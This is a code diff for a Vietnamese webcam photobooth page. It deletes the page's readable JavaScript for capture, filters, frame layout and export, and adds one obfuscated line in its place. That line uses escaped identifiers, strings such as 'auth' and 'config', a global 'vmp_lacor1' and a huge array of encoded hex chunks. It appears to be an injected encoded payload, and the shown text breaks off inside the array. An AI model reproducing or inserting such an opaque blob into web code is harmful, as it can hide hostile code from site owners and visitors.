+      <i class="fa-solid fa-magnifying-glass-minus"></i>
+      <input type="range" id="crop-zoom-slider" min="100" max="300" value="100" oninput="onZoomChange(this.value)">
+      <i class="fa-solid fa-magnifying-glass-plus"></i>
+    </div>
+
+    <div class="crop-actions">
+      <button class="btn-crop-cancel" onclick="closeCropModal()">Hủy</button>
+      <button class="btn-crop-confirm" onclick="applyCropAndSave()">Cắt & Dùng Ảnh</button>
+    </div>
+  </div>
+</div>
+
 <canvas id="export-canvas"></canvas>
 
 <script>
-  const video = document.getElementById('webcam');
-  const countdownEl = document.getElementById('countdown');
-  const statusPill = document.getElementById('status-pill');
-  const btnSelectFrame = document.getElementById('btn-select-frame');
-  const btnNextPage = document.getElementById('btn-next-page');
-  const activeFrameOverlay = document.getElementById('active-frame-overlay');
-  const gridOverlay = document.getElementById('grid-overlay');
-
-  const photos = [null, null, null, null];
-  const fxState = { timestamp: false, lightleak: false, vignette: false, grain: false, chromatic: false };
-
-  // ==================== CẤU HÌNH VỊ TRÍ Ô ẢNH CHO TỪNG KHUNG ====================
-  // Tọa độ (x, y, w, h) được đo chính xác từ vùng trong suốt (alpha = 0) của từng
-  // file PNG khung gốc, theo kích thước gốc natural (880 x 2650px).
-  // Nhờ vậy ảnh sẽ nằm khớp đúng vào từng "ô trắng" của mỗi mẫu khung, thay vì
-  // dùng chung 1 vị trí cố định cho mọi khung như trước.
-  const FRAME_CONFIG = {
-    frame1: {
-      natural: { w: 880, h: 2650 },
-      boxes: [
-        { x: 55, y: 64,   w: 770, h: 563 },
-        { x: 57, y: 676,  w: 769, h: 564 },
-        { x: 57, y: 1287, w: 769, h: 563 },
-        { x: 55, y: 1907, w: 770, h: 564 }
-      ]
-    },
-    frame2: {
-      natural: { w: 880, h: 2650 },
-      boxes: [
-        { x: 63, y: 73,   w: 754, h: 549 },
-        { x: 64, y: 684,  w: 754, h: 549 },
-        { x: 68, y: 1296, w: 754, h: 548 },
-        { x: 63, y: 1907, w: 755, h: 553 }
-      ]
-    },
-    frame3: {
-      natural: { w: 880, h: 2650 },
-      boxes: [
-        { x: 55, y: 63,   w: 770, h: 565 },
-        { x: 57, y: 676,  w: 769, h: 565 },
-        { x: 57, y: 1287, w: 769, h: 565 },
-        { x: 55, y: 1908, w: 770, h: 565 }
-      ]
-    }
-  };
-  // Bố cục dự phòng dùng cho khung tự tải lên (không có dữ liệu ô đo sẵn)
-  const FALLBACK_CONFIG = {
-    natural: { w: 880, h: 2650 },
-    boxes: [
-      { x: 57, y: 119,  w: 766, h: 470 },
-      { x: 57, y: 636,  w: 766, h: 470 },
-      { x: 57, y: 1153, w: 766, h: 470 },
-      { x: 57, y: 1670, w: 766, h: 470 }
-    ]
-  };
-
-  let currentFrameKey = 'frame1'; // khung mặc định đang được chọn (khớp .frame-item.selected trong HTML)
-
-  // Đặt vị trí + kích thước 4 ảnh xem trước (res-0..res-3) theo % dựa trên box của khung đang chọn
-  function positionPhotosLayer(key) {
-    const cfg = FRAME_CONFIG[key] || FALLBACK_CONFIG;
-    const { w: nw, h: nh } = cfg.natural;
-    cfg.boxes.forEach((box, i) => {
-      const img = document.getElementById(`res-${i}`);
-      if (!img) return;
-      img.style.left = (box.x / nw * 100) + '%';
-      img.style.top = (box.y / nh * 100) + '%';
-      img.style.width = (box.w / nw * 100) + '%';
-      img.style.height = (box.h / nh * 100) + '%';
-    });
-  }
-
-  // Vẽ ảnh vào canvas theo kiểu object-fit: cover (không bị méo ảnh)
-  function drawImageCover(ctx, img, x, y, w, h) {
-    const imgRatio = img.width / img.height;
-    const boxRatio = w / h;
-    let sx, sy, sw, sh;
-    if (imgRatio > boxRatio) {
-      sh = img.height;
-      sw = sh * boxRatio;
-      sx = (img.width - sw) / 2;
-      sy = 0;
-    } else {
-      sw = img.width;
-      sh = sw / boxRatio;
-      sx = 0;
-      sy = (img.height - sh) / 2;
-    }
-    ctx.drawImage(img, sx, sy, sw, sh, x, y, w, h);
-  }
-
-  // 1. Khởi Tạo Webcam
-  navigator.mediaDevices.getUserMedia({ 
-    video: { 
-      width: { ideal: 1280 }, 
-      height: { ideal: 960 }, 
-      facingMode: "user" 
-    }, 
-    audio: false 
-  })
-  .then(stream => {
-    video.srcObject = stream;
-  })
-  .catch((err) => { 
-    console.error("Lỗi camera:", err);
-    statusPill.innerText = 'Không thể truy cập Camera'; 
-  });
-
-  // 2. Chuyển Bộ Lọc Màu & Hiệu Ứng
-  function setFilter(type, btn) {
-    document.querySelectorAll('.filter-card .pill-btn').forEach(b => b.classList.remove('active'));
-    btn.classList.add('active');
-    video.className = '';
-    if (type !== 'normal') video.classList.add(`filter-${type}`);
-  }
-
-  function toggleGrid(checkbox) {
-    gridOverlay.classList.toggle('active', checkbox.checked);
-  }
-
-  function toggleFx(type, btn) {
-    fxState[type] = !fxState[type];
-    btn.classList.toggle('active', fxState[type]);
-  }
-
-  // 3. Logic Chụp Ảnh
-  document.getElementById('start-auto-btn').addEventListener('click', async () => {
-    const timerSec = parseInt(document.getElementById('timer-select').value);
-    for (let i = 0; i < 4; i++) {
-      if (getCapturedCount() >= 4) break;
-      await runCountdown(timerSec);
-      snapToEmptySlot();
-    }
-  });
-
-  function snapSingle() {
-    if (getCapturedCount() >= 4) return alert("Đã chụp đủ 4/4 tấm!");
-    snapToEmptySlot();
-  }
-
-  function snapToEmptySlot() {
-    const emptyIndex = photos.findIndex(p => p === null);
-    if (emptyIndex !== -1) {
-      photos[emptyIndex] = captureFrame();
-      renderSlots();
-    }
-  }
-
-  // ĐÃ SỬA: Giữ số 1 hiển thị đủ 1 giây trước khi tiến hành chụp
-function runCountdown(sec) {
-    return new Promise(resolve => {
-      countdownEl.style.display = 'flex';
-      let count = sec;
-      countdownEl.innerText = count;
-
-      const timer = setInterval(async () => {
-        count--;
-        if (count > 0) {
-          countdownEl.innerText = count;
-        } else {
-          // 1. Dừng bộ đếm
-          clearInterval(timer);
-          
-          // 2. Ẩn số ngay lập tức
-          countdownEl.style.display = 'none';
-          
-          // 3. Đợi đúng 0.1 giây (khoảng trống không có số) rồi mới ra lệnh chụp
-          await new Promise(r => setTimeout(r, 100));
-          
-          resolve(); // Hoàn thành đếm ngược -> Tiến hành chụp
-        }
-      }, 1000);
-    });
-  }
-
-  function captureFrame() {
-    const c = document.createElement('canvas');
-    const vw = video.videoWidth || 640;
-    const vh = video.videoHeight || 480;
-
-    c.width = vw;
-    c.height = vh;
-
-    const ctx = c.getContext('2d');
-    if (video.className) ctx.filter = getComputedStyle(video).filter;
-    
-    ctx.translate(c.width, 0); 
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, vw, vh);
-
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
-    ctx.filter = 'none';
-    applyEffects(ctx, c.width, c.height);
-    return c.toDataURL('image/png');
-  }
-
-  function applyEffects(ctx, w, h) {
-    if (fxState.lightleak) {
-      const grad = ctx.createLinearGradient(0, 0, w, h);
-      grad.addColorStop(0, 'rgba(255,180,90,0.35)');
-      grad.addColorStop(0.35, 'rgba(255,120,150,0.12)');
-      grad.addColorStop(1, 'rgba(255,255,255,0)');
-      ctx.globalCompositeOperation = 'screen';
-      ctx.fillStyle = grad;
-      ctx.fillRect(0, 0, w, h);
-      ctx.globalCompositeOperation = 'source-over';
-    }
-    if (fxState.chromatic) {
-      ctx.globalCompositeOperation = 'screen';
-      ctx.globalAlpha = 0.15;
-      ctx.drawImage(ctx.canvas, -3, 0);
-      ctx.drawImage(ctx.canvas, 3, 0);
-      ctx.globalAlpha = 1;
-      ctx.globalCompositeOperation = 'source-over';
-    }
-    if (fxState.vignette) {
-      const grad = ctx.createRadialGradient(w / 2, h / 2, h / 3, w / 2, h / 2, h / 1.05);
-      grad.addColorStop(0, 'rgba(0,0,0,0)');
-      grad.addColorStop(1, 'rgba(0,0,0,0.55)');
-      ctx.fillStyle = grad;
-      ctx.fillRect(0, 0, w, h);
-    }
-    if (fxState.grain) {
-      const grainCount = Math.floor((w * h) / 900);
-      for (let i = 0; i < grainCount; i++) {
-        const gx = Math.random() * w, gy = Math.random() * h;
-        ctx.globalAlpha = Math.random() * 0.25;
-        ctx.fillStyle = '#fff';
-        ctx.fillRect(gx, gy, 1.4, 1.4);
-      }
-      ctx.globalAlpha = 1;
-    }
-    if (fxState.timestamp) {
-      const now = new Date();
-      const text = now.toLocaleDateString('vi-VN') + '  ' + now.toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
-      ctx.font = `${Math.floor(h * 0.035)}px 'Courier New', monospace`;
-      ctx.textAlign = 'right';
-      ctx.fillStyle = 'rgba(255,214,10,0.9)';
-      ctx.fillText(text, w - 20, h - 20);
-    }
-  }
-
-  function deleteSlot(index) {
-    photos[index] = null;
-    renderSlots();
-  }
-
-  function renderSlots() {
-    let count = 0;
-    for (let i = 0; i < 4; i++) {
-      const box = document.getElementById(`slot-box-${i}`);
-      const img = document.getElementById(`img-${i}`);
-      if (photos[i]) {
-        img.src = photos[i];
-        box.classList.add('has-img');
-        count++;
-      } else {
-        img.src = '';
-        box.classList.remove('has-img');
-      }
-    }
-
-    statusPill.innerText = `Đã Chụp ${count}/4`;
-
-    if (count === 4) {
-      btnSelectFrame.classList.add('active');
-      btnNextPage.style.display = 'block';
-    } else {
-      btnSelectFrame.classList.remove('active');
-      btnNextPage.style.display = 'none';
-    }
-  }
-
-  function getCapturedCount() {
-    return photos.filter(p => p !== null).length;
-  }
-
-  function resetAll() {
-    for (let i = 0; i < 4; i++) photos[i] = null;
-    renderSlots();
-  }
-
-  function uploadImage(e) {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = (evt) => {
-        const emptyIndex = photos.findIndex(p => p === null);
-        if (emptyIndex !== -1) {
-          photos[emptyIndex] = evt.target.result;
-          renderSlots();
-        } else {
-          alert("Đã đầy 4 ô!");
-        }
-      };
-      reader.readAsDataURL(file);
-    }
-    e.target.value = '';
-  }
-
-  // ==================== CHUYỂN TRANG & GHÉP KHUNG ====================
-  function goToStep2() {
-    if (getCapturedCount() < 4) {
-      return alert("Bạn cần chụp đủ 4 tấm trước khi sang Chọn Khung!");
-    }
-    document.getElementById('step-1').classList.remove('active');
-    document.getElementById('step-2').classList.add('active');
-
-    for (let i = 0; i < 4; i++) {
-      document.getElementById(`res-${i}`).src = photos[i];
-    }
-
-    const selectedEl = document.querySelector('.frame-item.selected');
-    if (selectedEl) {
-      currentFrameKey = selectedEl.dataset.frame;
-      activeFrameOverlay.src = selectedEl.querySelector('img').src;
-    }
-
-    // Căn 4 ảnh khớp đúng vị trí ô trống của khung đang chọn
-    positionPhotosLayer(currentFrameKey);
-  }
-
-  function goToStep1() {
-    document.getElementById('step-2').classList.remove('active');
-    document.getElementById('step-1').classList.add('active');
-  }
-
-  function applyFrame(frameKeyOrSrc) {
-    let src = frameKeyOrSrc;
-    const selEl = document.querySelector(`.frame-item[data-frame="${frameKeyOrSrc}"]`);
-    
-    document.querySelectorAll('.frame-item').forEach(el => el.classList.remove('selected'));
-    if (selEl) {
-      src = selEl.querySelector('img').src;
-      selEl.classList.add('selected');
-      currentFrameKey = frameKeyOrSrc; // khung có sẵn -> dùng đúng tọa độ đo riêng
-    } else {
-      currentFrameKey = null; // khung tự tải lên -> dùng bố cục dự phòng
-    }
-    
-    activeFrameOverlay.src = src;
-    positionPhotosLayer(currentFrameKey);
-  }
-
-  function loadCustomFrame(e) {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = (evt) => {
-        applyFrame(evt.target.result);
-      };
-      reader.readAsDataURL(file);
-    }
-    e.target.value = '';
-  }
-
-  function filterFrames(keyword) {
-    const kw = keyword.trim().toLowerCase();
-    const items = document.querySelectorAll('.frame-item');
-    let visibleCount = 0;
-    items.forEach(item => {
-      const match = item.dataset.name.includes(kw);
-      item.classList.toggle('hidden', !match);
-      if (match) visibleCount++;
-    });
-    document.getElementById('no-result-msg').style.display = visibleCount === 0 ? 'block' : 'none';
-  }
-
-  // Xuất Canvas HD - dùng đúng độ phân giải gốc của khung (880x2650) và tọa độ ô ảnh riêng của từng khung
-  function downloadFinalImage() {
-    const canvas = document.getElementById('export-canvas');
-    const ctx = canvas.getContext('2d');
-
-    const cfg = FRAME_CONFIG[currentFrameKey] || FALLBACK_CONFIG;
-    canvas.width = cfg.natural.w;
-    canvas.height = cfg.natural.h;
-
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-    let loadedCount = 0;
-    photos.forEach((src, index) => {
-      if (!src) return;
-      const img = new Image();
-      img.src = src;
-      img.onload = () => {
-        const box = cfg.boxes[index];
-        // Ảnh nằm dưới, vẽ theo kiểu cover để lấp đầy đúng ô mà không méo hình
-        drawImageCover(ctx, img, box.x, box.y, box.w, box.h);
-
-        loadedCount++;
-        if (loadedCount === 4) {
-          // Khung (frame) được vẽ đè lên trên cùng, sau khi 4 ảnh đã nằm dưới
-          const frameImg = new Image();
-          frameImg.crossOrigin = "anonymous";
-          frameImg.src = activeFrameOverlay.src;
-          frameImg.onload = () => {
-            ctx.drawImage(frameImg, 0, 0, canvas.width, canvas.height);
-
-            const a = document.createElement('a');
-            
-            // Tạo dãy số ngẫu nhiên gồm mốc thời gian + 4 chữ số ngẫu nhiên
-            const randomNum = Date.now();
-            a.download = `PhotoXinhh_${randomNum}.png`;
-
-            a.href = canvas.toDataURL('image/png');
-            a.click();
-          };
-        }
-      };
-    });
-  }
+  "use strict";!(function(c,f){typeof exports==="object"&&typeof module!=="undefined"?module.exports=f():c["\\u0041\\u0070\\u0070\\u0042\\u006f\\u006f\\u0074\\u0073\\u0074\\u0072\\u0061\\u0070"]=f();})(typeof globalThis!=="undefined"?globalThis:window,function(){"use strict";var _0x92ae=["\x69\x6e\x69\x74","\x72\x65\x61\x64\x79","\x63\x6f\x6e\x66\x69\x67","\x63\x6f\x72\x65","\x61\x75\x74\x68"],_cfg={v:"1.0.0",lvl:2,env:"prod"},_0x3a6c=typeof globalThis!=="undefined"?globalThis:window,vmp_lacor1=_0x3a6c["vmp_lacor1"]||(_0x3a6c["vmp_lacor1"]={});var _0x2baf=+new Date()>0?1:0;var _0xdd38=function(_0xf14e){return arguments[0]>>>0;};var _0xe2a5=6^6;var _0xbc6c=["\u0063\u006f\u006d\u0070\u006c\u0065\u0074\u0065","\u0076\u0065\u0072\u0069\u0066\u0069\u0065\u0064","\u006f\u006b"];var _0x1aa0=["a1bcc38e","0116a88a","01168497","0113febe","48008cf4","d2b27b5a","4936a0be","ac85d6b3","4f36998d","d8b25821","0f12a3be","d4875e1b","c7f35026","acb6fcb1","f1940406","f1b6d9bb","011684be","01378e8e","8891f8ae","7e53fbb2","4a39b1be","f19a4128","d5960b1b","d6f35026","87a07117","beadd68e","88b6741b","8891f580","0113a0be","f1af7530","5136aebe","5111f884","f192e685","d5af752e","b1f6e08e","5b13998a","e8a00e1b","91b6d986","abb6e099","7811a3be","d5995627","d8b90e21","783af4f6","c3940422","5c11a3be","88b3501b","d6a06f2b","feaaf5b7","88b36928","7808afab","beaadf8e","5112b184","7813b193","f1b6e088","f1940453","d2b36909","013784ff","5b3aaff6","f1b38199","f1b3d1f3","01139985","f7f30b28","49208484","abb6e0a9","8ef6fc9a","7834afab","01378484","e8a0512b","ba91e68f","7e27ba8d","88944e53","bf93e088","0134a1ab","8eb4f2fa","bfa1dabb","01138fab","f1b6d9bb","feaaf5ad","c3af750c","91a5d1a9","88b3501b","0134f484","beb6c880","0113a0be","4813b185","d8b94a2e","88977b1b","f1b3d1a4","ab82d688","81a06f21","ba95d6ae","f1b3fdbb","e8a85104","010aa3be","c096501b","7837f4f6","83b7d9a4","91a5d68b","73139983","4f36a090","aff4f897","acade08e","c39a585a","780ff493","5112a0be","86f36956","0113a0be","7627a0ac","4e398ef5","5b3abef5","5c20af8e","c6b64104","ba9cd6ac","f192f2bb","783af4f6","013784ff","f082e088","c696500d","d5a0042c","f1b6fdbb","be93d9a9","e8b56e28","f1a27e2f","d5a00d53","c6a4531b","0027a083","818e7c15","89975f2f","d2b3692f","91add68b","f1b3d7bb","86b7fd86","81af6a04","f191f8f1","c794710c","beaaf181","f192e0a9","feadd8b1","c696500d","88b4dabb","5b27af8d","c6966906","0137a18a","8897745a","f19282e8","0e39f494","0113999f","f192f78b","4e08afb3","c7875026","5b1399ac","ab9fdf8b","8897501b","a1bc878e","0027a088","fea5de8b","d5b3562e","aca58db7","783481ab","beadf781","88b3501b","d8b65821","4f13aebe","4e348cbc","d5975f2b","5d27aeff","d2b36909","5c00f4b2","0137a19c","88b3501b","84af0419","c7a84120","f1a85f0e","88b3501b","0f04a3be","5a04a3be","d59a6a04","3844d823","f19282e8","88970b48","0113a685","88b3501b","f19282e8","bf93e088","ab9ff18b","ac9f8480","5b20a18b","88b64a39","bf93e0b7","c7a07f50","610085b2","c3990b21","88b36911","0f12a3be","4936a0be","0027998d","5119f184","5b13999c","88b3531b","ab9ff18b","bfb3c881","0137fbed","b9241463","0027998d","f7af6a19","f192c3e8","5119fda1","889ff8f1","d2f37f1b","f1946a11","dbf20a26","c7975f09","783a81f4","f191c7f6","f1b6d9bb","f1b6e099","acf48d81","c7805612","4e5385b4","762799aa","4e0ff48b","88b3501b","7e0fbe84","d596690c","0134859c","f1b3fdbb","88b3501b","0f16a3be","c7940456","01348e8b","86f36956","d8b14a0d","c3b97b5a","5b3aa78e","e8b6531b","5b2088f5","b89cc78b","e6844c16","c7876926","ab9ff18b","0f13aebe","4f04a3be","49208484","f1b3c8f6","ac918d91","c6a4531b","0113a0be","5f00aebe","88b6741b","d8b2081b","d5a00417","0113a0be","f1b3692b","c39a512c","f1b6d9bb","c696500f","0f16a3be","f7b17b5a","a1b4d9bb","4e36a0ac","feade0f7","0e36a083","88a5e681","81af6a04","8894712e","d5a04a50","ab9fe3f1","5c39a68e","83b7fa8f","7e0f9abc","91b6d98a","88b3501b","5c3afd85","bfb7d999","fd9fe38e","fe85d6b7","0e0fb1ac","5c0fa7a9","fab20b21","88b60d0f","adf7dafa","0134a1ab","f1b6e0f1","b993d9bb","f1b3d1a4","d5990417","89b27b5a","c3ad6b2b","d2b36939","bef6fcb7","f1b6d9bb","f1b6e09a","bf82e086","baaa8481","01378bff","c399081b","88944e0c","f1b6e0b9","d2aa531b","0116a884","87af4e20","7802f484","aca58db7","01139983","f19a7151","ab9fd881","4f16a084","d5a00417","73139983","4e208ea9","feadd68b","4a39a18c","f191fca9","0116fe8a","feade0b2","beaddf8e","f1b6d9bb","d59a6a0f","87af6a31","4f139983","0116f8f3","91a5e3a2","ac918df3","f1b1531b","0116ba9c","8892faa9","d2b36950","88b3690c","5112fbf6","011684be","f1b3c399","e8b6531b","88975117","f1b1531b","88b36919","a1b484f6","88974a48","ba9c81bb","adf7dabb","be9181a9","c7f37509","5c0fa1a8","4f36a090","61008cb2","aca5e380","bf82e086","0f12a3be","91add8a4","f192d899","7313aebe","87a87e24","84af0421","0116fdaa","88b36926","88b3501b","8897745a","6108a18b","5b1399b4","0113a0be","5119a0a1","fab97b5a","f191f8b1","0013fbbe","0113999f","4e27a6bc","89b37811","86a06f2b","feadd6f0","bf93e09a","d5965711","ba9f8d8e","0f30a18b","88b34a2b","f191d8ae","b993d9bb","0e20afb2","f1b6e0f0","88b3501b","88b3501b","f1b6d9bb","baaac8f0","0034f4f6","be8581bb","5b1399ac","7800f4f6","f1b6d9bb","f1b6d9bb","87a05e48","a1bc84bb","7312a0a1","87af7c17","d8b90d04","7353aebe","c096501b","5b1399ac","e8a05720","f1b6d9bb","d8b20e2f","c7a0752e","86a8692b","9f81e4ac","4f16b1a1","0113a0be","0e008bed","bea5f6bb","d5a00417","ac918d91","5b13998a","f1b6d9bb","88b6c8f0","b8a7f793","beb6deae","ba9c82bb","88f6d7bb","ac9c8db7","080f8ca8","8382d7bb","b4a15181","ff876951","d5af0c1b","c096501b","c096501b","adb6e0f0","d5805f51","f8aacaac","87805f17","c7947c39","f1b3fd92","4a39f8be","011399bc","8690512e","5c39afab","4a0ff4f6","fab25004","c39a7151","0134b1ed","7853aebe","ac918db9","ab85e3ad","0f34f4b4","4851be81","f1b6d9bb","a1b4c395","d5877511","00128bff","01378bff","ab9fd881","d29a572b","bf93d9af","bead88a9","88b36919","b993d9bb","ba92d6ad","c7af562e","adf7dafa","88b6fc8e","88b60e35","5b139984","01378bbe","c1a00451","abb6e099","88b36919","aca5f5af","88b36950","ac9ffabb","d580512e","88b3501b","ff876911","7834f494","c7a85f16","ba918481","0113a0be","7d00f8ac","f192f2bb","91adc78b","ac91e3b1","f1b3fdbb","8891f8ae","fea5f88e","818e7c15","bf93d999","ffa1dabb","88944e0c","c096501b","f19282e8","91a5d68e","e8b6531b","beadd6fe","e8b56e28","0e088385","f194710e","f1b6df96","0134b1ed","8891f5f3","610f8eab","f1a07519","88b3501b","c399081b","f1b6e082","7627a0a1","5111a3be","ffb3dabb","5b0aa3be","d8b15821","c6966906","5b13a0a1","88977b1b","f192f2bb","7813b1f5","fe9cd6f6","2d914d42","f192f2bb","f1b384af","7802f484","5b5399b2","5c20a18b","762799f4","f1a7c793","0113a0be","5c349a8a","5113aebe","abb6e0a9","8e82c388","bead88a9","88b3501b","0f16a3be","91b6d986","88b3501b","be858db7","d6946a2e","baaa8d8e","5c08a0ed","f191c8e8","88944e0d","acb6c388","0f57f49f","0113998d","5c39b1b2","51168bbe","ff875009","88b4dabb","ad82d7fa","ad82d7fa","d594042e","4a2e9ff5","d5af510d","d8b90d04","87a8512f","5111a8be","d8b20b21","88b37435","f192f78b","f1b6e0f1","c096501b","f0b6c3b7","beadd690","88947317","a1b4c38e","c6a4531b","88944148","f191c8e8","4a3a9fa9","88aaf8f1","0e0f8cb2","7e3699b2","4936a0be","ac9fc8bb","f192c3e8","f194710f","89b27b5a","f1b6d9bb","88870150","baf48dac","f1b6d9bb","83a8501b","0102bef5","beadfae8","e8a00e1b","c6a40a26","5f208ea9","91a5de8b","f192f2bb","6100a18e","d58e510c","e8b35e1b","c7875750","61008585","bfa1dabb","4e0d8ea9","0113a0be","7834b184","86b2531b","c3804e0c","5c34f4bc","f1b6d9ae","f1b6d9bb","f082d98d","ab85d88e","0113a693","c7940456","7830f4b4","5116ba84","d2b36939","01139993","f1b6d9bb","4a3a9a94","f1b6e096","88b6e09a","f7f30b28","88b60d39","bfa1dafa","88b3501b","91add8a4","f192f2bb","c696500d","ac9fd88e","8891d8a9","c7a8081b","0113a0be","7d34f4f5","c1947111","0113a0be","4e57bef3","d580512e","4a39b1be","7319f8be","e8a8571b","f1b6d9bb","0113a0be","d5805f51","011399b2","f1cb714d","ba9cd6ac","491ba3be","d594042e","d580512e","abb6e08f","ff876911","6108a196","d5947c2e","88b3501b","83bcd9bb","88944e0d","f1b3d981","d594042e","f1a06f21","5111f184","4936a0be","5c00f4f6","f191f891","bf93d999","a1bcd9bb","f1b3d1f0","0113a0be","ac9cf1b7","8897745a","0e08afa8","89f35020","88b67426","0f16a3be","bea5f6b7","c7f37511","ab85c8bb","86b2531b","4936a0be","f19282e8","0134a1a9","762799f5","bf93d9ad","5d52a3ff","acaafcb1","0116a8f3","ff8282bb","8894760c","83bc87ad","f1b6d9bb","e8a05720","d580081b","ffb2741b","f19182bb","a1b7878f","d5975f2b","89977e2b","8693d9a4","610ff4f4","c6a4531b","86fe5121","c6875e1b","f192f2bb","0116f1f6","5127aebe","88b65021","abaf839a","fe9cd6f6","4e08af91","bea5fc8e","d5f1510e","491ba3be","88b3501b","0e009fb4","d5a00417","ac918db9","00128bff","87af7c0d","88b3501b","beadd684","87a85f0d","f1b3faa4","bfa1dabb","01378bff","bd8fdea4","0116a8f6","d5946a2f","ba92d6ad","483481b4","0f5399f3","88977421","bf93d9f6","5112f184","0116ba9c","a1b48181","86a4531b","bfa1dabb","abb6e0a9","f1940431","f1b6e088","88b36950","88b3501b","f1a20421","88b3501b","0f5399f3","ac93e0b9","ffe531e2","011684be","f1940453","d5995150","4a3a9a94","00139af5","f1b1531b","f1947515","87a05e48","ba9f8db1","61159e8d","88947e2e","0113a0be","f1b6d9bb","0116fdaa","be918dae","013488f6","5c3af4f3","4a2ba18e","7311a3be","0116baa8","d2aa531b","c6965039","88b3501b","a3aafca9","d487692b","f1af7530","c6a4531b","5c39a68e","baaa84bb","acaad8ad","8891e38e","5b1399aa","88b3501b","d2b36917","011399bc","d8b95821","86875026","c7a8081b","c6b36926","5f34f4aa","0137b184","c7977e0c","fe82c388","aca58480","ba9cd889","4936a0be","4f13aebe","86b6531b","783481aa","f4a07551","4e0f9f8e","4936a0be","86a4531b","a1bc8881","5b1399b2","f19a7151","0f009f8e","c1f70407","be93d9a9","0116f89c","ba9f8dac","abb6e08f","0e0f8ca8","e8a07809","61008585","f082e088","f192f2fa","88947317","f885f884","d8b14a2e","0113a0be","0f53a0ff","f1a07519","88b37f1b","0113a0be","0134b1f5","8892f78b","4e0fa68b","ba9fe381","5c3699b4","4e208ea9","0137b1ed","011399b2","88970b21","d580512e","c7a0512e","afa5e68b","5d27998e","d2b36939","0e39f494","c3975f2f","f7f36925","87af7c17","7627a0a1","d2804e50","84947121","4a3af8be","a1b3d988","fea5de8b","be92d6a9","ac91e38e","0e39aff5","6f249da9","f1af7151","f191d8ae","6127fbbe","c7947c19","ba9cc3bb","762799bc","4936a0be","ba9ff591","bfa1dabb","f1b6e086","fefb8d87","4936a0be","4e0fa68b","c0bb531b","c096501b","c48f7117","be82deae","7313aebe","8ef68288","d2a8512b","88b3501b","be91f8ac","f1b35704","d8b37f2e","8693e088","c696500d","4f36a0a8","78028e8a","be93d9a9","f19282e8","b993d9bb","4936a0be","d2b36939","f1b35026","faf35e1b","4a39baf5","c7800417","86a4531b","5b13999c","88b6fc80","4e0ffdac","f1b37520","c7b3561b","5b3aafa9","8885c381","78138585","88b3501b","88b36922","88a5de8b","86f36956","91918df0","feaadff3","4e00858b","0e00a78e","91b3dabb","ffa1dabb","c1947111","78088e8e","0e009fb4","ff9281bb","f1b6d9bb","83b784b1","81807124","4936a0be","d5a04a17","ac85d6f1","5c34fdac","88b6741b","0e009f84","abafdabb","beadc8bb","4e008fb2","c7a0752e","f192fd81","abafdabb","c3af0424","88a5fcb9","0134f1b2","f1b1531b","d597512b","f192fdfa","6108a18e","c7b20848","4f36a0f6","0f5781f4","4936a0be","ba92d6ad","ba93e0f0","d5946a2f","ac918db9","87a05e48","aba5f78e","5f00a7a1","87a05e48","f1b3fdbb","b993d9bb","f191d6ae","b993d9bb","d8b17321","88a5fc8e","89b27b5a","5f2b8e96","88b3501b","f192c3e8","88a7f78f","acade08e","ac9184a9","88b60d0f","b993d9bb","407c8894","bf93d9af","5c0ffcbe","f4a00809","7853a0ab","7837f4f6","ff875009","f192fd81","f1b6d9bb","8892f8a4","5c00f4f6","f191c7ac","adf7dabb","beadfae8","88928df3","4936a0be","d2aa531b","f1b6e082","0113a0be","3b6a6f8a","4a3a9a94","4f36a0a8","faf35e1b","8891e3f3","f1b1531b","ffb6d7bb","88b3501b","c7874a21","7e53fbf5","7e53fb8d","0e0f9a8b","d5af0c5a","5c3a9aaa","4f36a090","f7af6a21","f1b3fdbb","5b13999c","5c0fa1a8","5c20f894","e8a05720","f1b3fdbb","d5805f34","d5af752b","ac91f58e","c7875e1b","86f36956","780085bc","0102a1a9","d8b94139","0113a0be","4a39f8be","ba858db7","c696500d","0037a18e","d8b20e56","c096501b","f1974117","5c3aaf81","8382e086","0e08a1b4","6108a1a1","011684be","88944128","88b36950","c39a6a21","c3975f0d","d2b36911","c3af0d1b","83f6d7bb","01378ea8","d2aa531b","4e27b185","c7874150","4a37af8a","f192fdfa","8eaae3b9","c7a07c08","a1bcc8bb","ac8ed88b","5c36baf5","d8b25821","88a5fc8e","4d48f4a1","a1b7fabb","8e9cd6f0","d2f36917","0e0f9f8e","abafdabb","c7a0752e","d5800817","89946b2b","d4875e5a","5d37aebe","879a7c56","91a5de8b","acb6fcb1","4f36a0f6","781399aa","0113a0be","0016a884","0808f48b","88944148","abb6e0b1","879a7c56","fe9cd6f0","88928df3","4936a0be","c3f37520","f191fcac","f191c8e8","bf93d9ad","8eb4f2fa","d2806950","bf93d9ad","7811a3be","d5a00451","5c0fa1a8","c7a0752e","88adf7b7","88977421","ac92d88b","8890745a","0f5781b2","fe9cd6f6","91b3dabb","acf6d7bb","0113a0be","ac91e38f","f1b6d9bb","86b6531b","d596562e","91918db9","7311fe84","d4b3500f","baaad8ac","bf82d7bb","af918daf","ffb20c1b","4936a0be","f1b6d9bb","c7877551","7313aebe","f1b6e0f0","abb6e0b7","d58e510c","88b36926","0113a0be","88a26a19","4f04a3be","0e00aeed","86a4531b","011684be","01128483","d2807850","5c398e96","a28bd88c","4936a0be","91a5de80","0f53998b","5c16a3be","abb6e099","4a3a81b2","5b0aa3be","e8a8512e","0134afab","f192fd81","88b4dabb","f192c8e8","88946a04","4a36fb8d","8894731b","f1b6e082","87a05e48","7e53fb8d","88b3501b","ac9c81a9","783afd85","adb7f2fa","0e208e8e","f19a0d09","0116a8a1","f885f884","0013baf6","0113a0be","ac92d88b","f1b67b5a","0f34f4b4","4a20bea9","bfa1dabb","81a06f21","bea5fa88","a1b78481","f1858db1","4e27a6aa","fab90121","88b3693a","c09a4e53","0027998d","88b36911","0f16a3be","ff96690f","d2b36919","c7a2510e","88b3501b","ff876950","5d27aeff","d8b95811","0d39afa9","0f34f4b4","aff4f897","f1b6d9bb","4a3a9a94","f191f7ae","faf36926","acaafcb1","a1b6d7bb","0116ba9c","4e12a3be","4f27aebe","f1b6d9bb","83b788f6","88b3741b","0137baed","6137f88d","0e0f8cb2","87af6f0c","c3f1040c","87a80850","91b68288","baf6c8f0","4a3af491","f0b7f2fa",